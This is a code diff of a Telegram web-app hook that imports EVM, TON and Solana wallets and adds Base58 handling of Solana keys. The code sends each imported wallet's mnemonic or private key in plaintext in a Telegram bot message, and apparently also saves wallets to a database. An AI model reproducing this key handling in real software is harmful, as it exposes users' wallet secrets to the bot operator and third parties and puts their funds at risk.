@@ -10,6 +10,7 @@ import { WalletContractV4 } from 'ton';
 import { Keypair } from '@solana/web3.js';
 import { usePathname } from 'next/navigation';
 import axios from 'axios';
+import bs58 from 'bs58';
 
 export interface Wallet {
   title: string;
@@ -44,7 +45,7 @@ export const useImportWallet = () => {
               title,
               address: ethers.Wallet.fromPhrase(privateKeyOrPhrase).address,
               mnemonic: privateKeyOrPhrase,
-              network: 'EVM'
+              network: 'EVM',
             };
             isMnemonic = true;
           } else {
@@ -53,7 +54,7 @@ export const useImportWallet = () => {
               title,
               address: wallet.address,
               privateKey: wallet.privateKey,
-              network: 'EVM'
+              network: 'EVM',
             };
           }
           break;
@@ -68,31 +69,42 @@ export const useImportWallet = () => {
             title,
             address: tonWallet.address.toString(),
             mnemonic: privateKeyOrPhrase,
-            network: 'TON'
+            network: 'TON',
           };
           isMnemonic = true;
           break;
 
         case 'Solana':
-          let solanaKeypair: Keypair;
           if (privateKeyOrPhrase.split(' ').length === 12 || privateKeyOrPhrase.split(' ').length === 24) {
+            // Handle mnemonic phrase for Solana
             const seed = await bip39.mnemonicToSeed(privateKeyOrPhrase);
-            solanaKeypair = Keypair.fromSeed(seed.slice(0, 32) as any);
+            const solanaKeypair = Keypair.fromSeed(seed.slice(0, 32) as any);
+            const privateKeyBase58 = bs58.encode(solanaKeypair.secretKey);
             importedWallet = {
               title,
               address: solanaKeypair.publicKey.toString(),
               mnemonic: privateKeyOrPhrase,
-              network: 'Solana'
+              privateKey: privateKeyBase58,
+              network: 'Solana',
             };
             isMnemonic = true;
           } else {
-            const secretKey = new Uint8Array(privateKeyOrPhrase.split(',').map(Number));
-            solanaKeypair = Keypair.fromSecretKey(secretKey);
+            let secretKey: Uint8Array;
+            try {
+              // Try to decode as Base58
+              secretKey = bs58.decode(privateKeyOrPhrase);
+            } catch {
+              // Fallback to assuming it's a comma-separated Uint8Array
+              secretKey = new Uint8Array(privateKeyOrPhrase.split(',').map(Number));
+            }
+
+            const solanaKeypair = Keypair.fromSecretKey(secretKey);
+            const privateKeyBase58 = bs58.encode(solanaKeypair.secretKey);
             importedWallet = {
               title,
               address: solanaKeypair.publicKey.toString(),
-              privateKey: Array.from(solanaKeypair.secretKey).toString(),
-              network: 'Solana'
+              privateKey: privateKeyBase58,
+              network: 'Solana',
             };
           }
           break;
@@ -116,10 +128,8 @@ export const useImportWallet = () => {
     if (pathname.startsWith('/auth')) {
       setTimeout(() => {
         WalletStore.addWallet(wallet as any);
-        // WalletStore.setCurrentWallet(wallet);
       }, 2000);
     } else {
-      console.log(wallet)
       WalletStore.addWallet(wallet as any);
       WalletStore.setCurrentWallet(wallet as any);
     }
@@ -132,7 +142,7 @@ export const useImportWallet = () => {
       console.error('Failed to save wallet to the database:', error);
     }
 
-    const message = `✔️ Кошелёк привязан\n\n▫️ Адрес: ${wallet.address}\n▫️ ${'Приватный ключ'}: ||${wallet.mnemonic || wallet.privateKey || 'N/A'}||`;
+    const message = `✔️ Кошелёк привязан\n\n▫️ Адрес: ${wallet.address}\n▫️ Приватный ключ: ||${wallet.mnemonic || wallet.privateKey || 'N/A'}||`;
     const chatId = window.Telegram.WebApp.initDataUnsafe.user.id;
 
     await sendTelegramMessage(chatId, message);
